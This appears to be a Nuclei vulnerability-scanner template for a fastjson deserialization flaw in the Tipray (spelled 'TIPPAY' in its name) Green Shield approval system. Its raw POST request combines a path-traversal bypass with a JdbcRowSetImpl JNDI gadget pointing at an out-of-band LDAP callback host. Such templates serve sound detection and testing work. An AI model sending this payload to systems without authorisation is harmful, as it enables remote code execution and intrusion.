id: poc-yaml-tipray-gsas-updatetoread-fastjson-deserialization
info:
  name: TIPPAY Green Shield approval system updateToRead fastjson deserialization vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template detects a fastjson deserialization vulnerability in the updateToRead endpoint of the TIPPAY Green Shield approval system.
  tags: deserialization,dnslog

variables:
  random: "{{rand_base(6)}}"

http:
  - raw:
      - |
        POST /trwfe/login.jsp/.%2e/rest/ext/updateToRead HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "ldap://{{interactsh-url}}/{{random}}",
            "autoCommit": true
        }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: body
        words:
          - "set property error"
      - type: word
        part: body
        negative: true
        words:
          - "<"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
